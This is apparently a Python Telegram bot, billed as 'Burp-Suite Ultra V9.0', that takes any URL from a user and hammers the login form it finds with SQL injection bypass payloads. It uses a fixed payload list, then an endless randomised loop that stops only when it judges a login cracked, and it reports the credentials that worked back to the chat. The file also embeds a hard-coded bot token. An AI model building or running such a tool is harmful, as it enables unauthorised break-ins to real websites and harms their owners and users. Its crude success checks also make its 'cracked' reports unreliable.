import telebot
import requests
from bs4 import BeautifulSoup
import time
import random
from flask import Flask
from threading import Thread

# Render को सक्रिय रखने के लिए Flask सर्वर
app = Flask('')
@app.route('/')
def home(): return "Burp-Suite Ultra V9.0 is Online!"
def run(): app.run(host='0.0.0.0', port=10000)
def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

# आपका बोट टोकन (नया वाला)
TOKEN = '8391067758:AAGE2NaejHoHVY7rpo6947n0WiTV2Hk41aY'
bot = telebot.TeleBot(TOKEN)

# SQL पेलोड लाइब्रेरी
global_sql_library = [
    "' or 1=1--", "admin' --", "admin' #", "' or ''='", "' or '1'='1",
    "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--",
    "admin') or ('1'='1", "admin\") or (\"1\"=\"1", "' or 1=1 LIMIT 1--",
    "\" or \"1\"=\"1", "' or 'a'='a", "' OR SLEEP(5)--"
]

def generate_infinite_sql():
    """AI Fuzzer: यह कभी न खत्म होने वाले पेलोड्स बनाता है"""
    tags = ["' OR ", "\" OR ", "') OR ", "')) OR "]
    logic = ["1=1", "'1'='1", "true", "admin'--", "99=99", "1=1 LIMIT 1"]
    comments = ["--", "#", "/*", " -- -"]
    return f"{random.choice(tags)}{random.choice(logic)}{random.choice(comments)}"

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🎯 **Burp-Suite Ultra V9.0 Active**\n\nURL भेजें। मैं तब तक हमला करूँगा जब तक लॉगिन न हो जाए।\n\n✅ **सफलता मिलने पर SQL, ID और Pass यहाँ आ जाएगा।**")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def attack(message):
    target_url = message.text
    chat_id = message.chat.id
    status_msg = bot.send_message(chat_id, "📡 रिस्पॉन्स स्कैन कर रहा हूँ...")

    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0'}

    try:
        initial_res = session.get(target_url, headers=headers, timeout=15)
        baseline_len = len(initial_res.text)
        
        soup = BeautifulSoup(initial_res.text, 'html.parser')
        form = soup.find('form')
        if not form:
            bot.edit_message_text("❌ एरर: लॉगिन फॉर्म नहीं मिला।", chat_id, status_msg.message_id)
            return

        inputs = form.find_all('input')
        input_names = [i.get('name') for i in inputs if i.get('name')]
        user_key = next((n for n in input_names if any(x in n.lower() for x in ['user', 'login', 'id'])), input_names[0])
        pass_key = next((n for n in input_names if 'pass' in n.lower()), input_names[1] if len(input_names)>1 else 'password')

        bot.edit_message_text(f"⚔️ **Attack Started!**\nTarget: `{target_url}`", chat_id, status_msg.message_id)

        found = False
        attempt = 1

        # 1. पहले लाइब्रेरी के पेलोड्स
        for p in global_sql_library:
            for u, pwd in [(p, p), ('admin', p)]:
                bot.edit_message_text(f"🔄 **Attempt:** `{attempt}`\n🧪 **Testing:** `{u[:25]}...`\n❌ **Status:** Wrong Payload... Trying Next 👇", chat_id, status_msg.message_id)
                if check_success(target_url, session, user_key, pass_key, u, pwd, baseline_len):
                    bot.send_message(chat_id, f"🔥 **SUCCESS! LOGIN CRACKED** 🔥\n\n✅ **SQL Payload:** `{u}`\n✅ **ID:** `{u}`\n✅ **PASS:** `{pwd}`")
                    found = True; break
                attempt += 1
                time.sleep(0.4)
            if found: break

        # 2. फिर AI Infinite Mode
        if not found:
            bot.send_message(chat_id, "🧠 लाइब्रेरी खत्म। अब AI पेलोड्स ट्राई कर रहा हूँ...")
            while not found:
                p = generate_infinite_sql()
                for u, pwd in [(p, p), ('admin', p)]:
                    bot.edit_message_text(f"🤖 **AI Engine Running...**\nAttempt: `{attempt}`\nTesting: `{u[:25]}...`\nStatus: Scanning... 🔎", chat_id, status_msg.message_id)
                    if check_success(target_url, session, user_key, pass_key, u, pwd, baseline_len):
                        bot.send_message(chat_id, f"🌟 **AI SUCCESS!** 🌟\n\n✅ **SQL:** `{u}`\n✅ **ID:** `{u}`\n✅ **PASS:** `{pwd}`")
                        found = True; break
                    attempt += 1
                    time.sleep(0.6)
                if found: break

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ एरर: {str(e)}")

def check_success(url, session, u_key, p_key, u, pwd, base_len):
    try:
        data = {u_key: u, p_key: pwd}
        start = time.time()
        r = session.post(url, data=data, allow_redirects=True, timeout=12)
        diff = time.time() - start
        if (diff > 4 and "sleep" in u.lower()) or abs(len(r.text) - base_len) > 70 or any(word in r.text.lower() for word in ["logout", "dashboard", "welcome"]):
            return True
    except: pass
    return False

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
